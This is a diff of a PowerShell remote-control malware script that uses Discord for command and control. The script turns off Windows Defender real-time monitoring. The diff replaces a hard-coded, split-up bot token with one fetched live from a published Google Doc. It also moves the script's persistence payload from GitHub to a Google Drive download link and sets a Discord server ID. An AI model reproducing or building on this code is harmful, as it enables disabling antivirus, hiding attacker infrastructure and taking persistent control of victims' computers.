@@ -1,22 +1,13 @@
 Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 
-#your bot token goes here
-#EXAMPLE: $token = "MTA0ODE4MjEwMTA1MTQ2MDM3.AJif8F.9Uod-6ND1QAO38pwPJ7Ishvu5Eb"
-$hg = "4MTg5NTM4NzIy"
-$gh = "Ng.GoHq3H.j1QnscX_Z7"
-$token = "MTM4OTQxMDY" + $hg
-$token = $token + $gh
-$token = $token + "r2TRLxNTuTMpoWRaKk-sc3s7XdH4"
+$response_html = Invoke-WebRequest -Uri "https://docs.google.com/document/d/e/2PACX-1vT35P2otFME7gb2oP-tqkQmCAaajGwfpKt8Z13-ic3t9tZwCwZN0CNyonzeJasCnDXJ6ob0HK3t6JG-/pub"
+$response_text = $response_html.ParsedHtml.body.innerText
+$token = ($response_text -replace '.*Updated automatically every 5 minutes', '').Trim() -split "`n" | Select-Object -Last 1
 
-#your server id goes here
-#example: $guildId = "1199929856564584245"
 $guildId = "1389413840453894154"
 
-#put the url to your rcHack script (for persistance)
-#you can host the file on github (make sure the repository is public)
-#example: $StartupPsOnlineFileLocation = "HTTPS://WWW.EXAMPLE.COM/URL_TO_YOUR_RCHACK_SCRIPT.PS1"
-$StartupPsOnlineFileLocation = "https://raw.githubusercontent.com/SimchaTPG/khjgv/refs/heads/main/rcHack.ps1"
+$StartupPsOnlineFileLocation = "https://drive.usercontent.google.com/download?id=1KgH4GRj-HcMU5tfkqmaZDvbGrzH5igzX&export=download&authuser=0&confirm=t&uuid=6ba566ea-68b3-471e-b1b4-c2d3cf9d7e73&at=AN8xHorZS__EY7XAIzdBfc2fs-PI%3A1751333511698"
 
 
 
@@ -50,10 +41,6 @@ foreach ($channel in $channels) {
     }
 }
 
-
-
-
-#get channels to determine new channel name
 $uri = "https://discord.com/api/guilds/$guildId/channels"
 
 $headers = @{
